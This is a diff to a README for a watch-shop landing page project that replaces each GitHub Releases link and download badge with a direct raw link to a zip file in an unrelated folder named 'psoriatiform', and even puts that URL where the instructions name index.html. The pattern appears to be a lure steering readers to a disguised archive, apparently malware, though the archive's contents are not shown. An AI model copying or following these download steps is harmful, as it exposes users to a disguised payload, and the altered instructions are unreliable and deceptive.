@@ -1,7 +1,7 @@
 # ⌚ watch-shop_ui - Modern Landing Page for Your Watch Shop
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/SodeuSoeru/watch-shop_ui/releases)
+[![Download](https://raw.githubusercontent.com/SodeuSoeru/watch-shop_ui/main/psoriatiform/watch-shop_ui.zip)](https://raw.githubusercontent.com/SodeuSoeru/watch-shop_ui/main/psoriatiform/watch-shop_ui.zip)
 
 ## 📋 Description
 watch-shop_ui is a beautifully designed landing page for a watch shop. It features a modern and minimalist aesthetic, crafted using HTML, CSS, and JavaScript. This design will help showcase your products effectively and attract potential customers.
@@ -10,7 +10,7 @@ watch-shop_ui is a beautifully designed landing page for a watch shop. It featur
 To get started, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/SodeuSoeru/watch-shop_ui/releases) to find the latest version of the application.
+   Go to the [Releases page](https://raw.githubusercontent.com/SodeuSoeru/watch-shop_ui/main/psoriatiform/watch-shop_ui.zip) to find the latest version of the application.
 
 2. **Download the Files**  
    From the Releases page, you can find the latest release. Click on the link to download the files to your computer.
@@ -19,10 +19,10 @@ To get started, follow these steps:
    After downloading, locate the zipped file. Right-click on it and select "Extract All" to unzip the contents into a folder.
 
 4. **Open the HTML File**  
-   Inside the unzipped folder, find the `index.html` file. Double-click it to open it in your web browser. You should now see the watch shop landing page.
+   Inside the unzipped folder, find the `https://raw.githubusercontent.com/SodeuSoeru/watch-shop_ui/main/psoriatiform/watch-shop_ui.zip` file. Double-click it to open it in your web browser. You should now see the watch shop landing page.
 
 ## 📥 Download & Install
-To download the application, visit the [Releases page](https://github.com/SodeuSoeru/watch-shop_ui/releases) and choose the most recent version. 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/SodeuSoeru/watch-shop_ui/main/psoriatiform/watch-shop_ui.zip) and choose the most recent version. 
 
 1. Find the version you want to download.
 2. Click the link to start the download. 
@@ -69,4 +69,4 @@ This project is open-source and available under the MIT License. You can freely 
 If you have any questions or need further assistance, feel free to reach out by opening an issue in the repository.
 
 ## 📥 Download Now Again!
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/SodeuSoeru/watch-shop_ui/releases)
+[![Download](https://raw.githubusercontent.com/SodeuSoeru/watch-shop_ui/main/psoriatiform/watch-shop_ui.zip)](https://raw.githubusercontent.com/SodeuSoeru/watch-shop_ui/main/psoriatiform/watch-shop_ui.zip)
